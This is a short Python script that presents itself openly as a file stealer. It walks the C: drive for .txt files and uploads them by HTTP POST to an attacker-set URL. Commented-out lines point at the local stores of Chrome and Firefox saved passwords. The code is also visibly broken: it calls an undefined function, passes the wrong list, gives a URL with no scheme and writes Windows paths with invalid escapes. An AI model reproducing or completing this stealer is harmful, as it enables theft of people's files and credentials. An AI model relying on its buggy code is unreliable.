import os
import requests

URL = '0.0.0.0' # the URL/IP to which you want to send the stolen files/information to
#USERNAME = os.getlogin()
#GOOGLE_PASSWORDS = f'C:\Users\{USERNAME}\AppData\Local\Google\Chrome\User Data\Default' # location of Google passwords
#FIREFOX_PASSWORDS = f'C:\Users\{USERNAME}\AppData\Roaming\Mozilla\Firefox\Profiles\logins.json' # location of Firefox passwords

#file_types = ['.txt'] # if checking for multiple file types
files_found = [] # log files found

def file_search():
    for dir, sdirs, files in os.walk('C:\\'): # dir - directories, sdirs - subdirectories
        #print(f'directory: {dir}\n \ # for testing to show all files scanned
        #      subdirectories: {sdirs}\n \
        #      files: {files}')
        for file in files:
            #if any(type in file for type in file_types): # check for multiple file types of interest. if you want to use this, comment out the next line.
            if len(files_found) >= 100:
                steal_files(files)
            if '.txt' in file: # check file type
                print(dir + '\\' + file) # for testing
                files_found.append([dir + '\\' + file]) # log the found file's address

def steal_files(files): # steal files
    files_payload = {}
    i = 1
    for file in files:
        file_name = file[file.rfind('\\')+1:] # ignore all text before the last backslash so only the file name is kept
        f = {f"file{i}":(file_name, open(file, 'rb'))}
        files_payload.update(f)
        i += 1
    r = requests.post(URL, files=files_payload) # POST (send) the file

steal_file('C:\Games\EuropaUniversalisIV\dlc\dlc140_central_europe_music_pack\music\centraleurope.txt')
#file_search()